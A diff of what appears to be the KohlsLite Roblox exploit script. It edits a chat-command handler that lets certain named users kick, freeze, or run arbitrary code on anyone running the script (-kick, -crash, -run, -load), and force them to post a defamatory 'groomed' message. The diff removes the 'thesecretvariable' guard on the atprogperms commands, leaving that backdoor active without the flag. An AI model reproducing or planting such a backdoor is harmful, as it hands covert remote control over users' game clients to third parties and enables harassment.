@@ -8378,9 +8378,7 @@ v.Chatted:Connect(function(msg)
                 end
 
         	if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-				if thesecretvariable == true then
                                 	Speak("atprog groomed me")
-				end
                 end
 
                 if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
@@ -8388,15 +8386,13 @@ v.Chatted:Connect(function(msg)
                                 	pcall(function()
                                         	game.Players.LocalPlayer:Kick("A KohlsLite collaborator kicked you from the game!")
                                 	end)
-				end
+                                end
                 end
 
                 if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-				if thesecretvariable == true then
                                 	pcall(function()
                                         	game.Players.LocalPlayer:Kick("A KohlsLite user with special perms kicked you!")
                                 	end)
-				end
                 end
 
 -- DO NOT REMOVE THE COMMENTS! - DO NOT REMOVE THE COMMENTS! - DO NOT REMOVE THE COMMENTS! - DO NOT REMOVE THE COMMENTS! - DO NOT REMOVE THE COMMENTS! - 
@@ -8418,9 +8414,7 @@ v.Chatted:Connect(function(msg)
                 end
 
                 if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-				if thesecretvariable == true then
-                                    	Remind("You have been warned by a KohlsLite user with special perms!")
-				end
+                                    	Remind("You have been warned!")
                 end
 
                 if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
@@ -8431,10 +8425,8 @@ v.Chatted:Connect(function(msg)
                 end
 
                 if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-				if thesecretvariable == true then
                                      while true do end
                                 -- game:Shutdown()
-				end
                 end
 
            	if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
@@ -8444,9 +8436,7 @@ v.Chatted:Connect(function(msg)
     		end
 
            	if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-				if thesecretvariable == true then
         				Execute(string.sub(msg, 6))
-				end
     		end
 
            	if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
@@ -8456,9 +8446,7 @@ v.Chatted:Connect(function(msg)
     		end
 
            	if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-				if thesecretvariable == true then
         				GExecute(string.sub(msg, 7))
-				end
     		end
 
                 end)
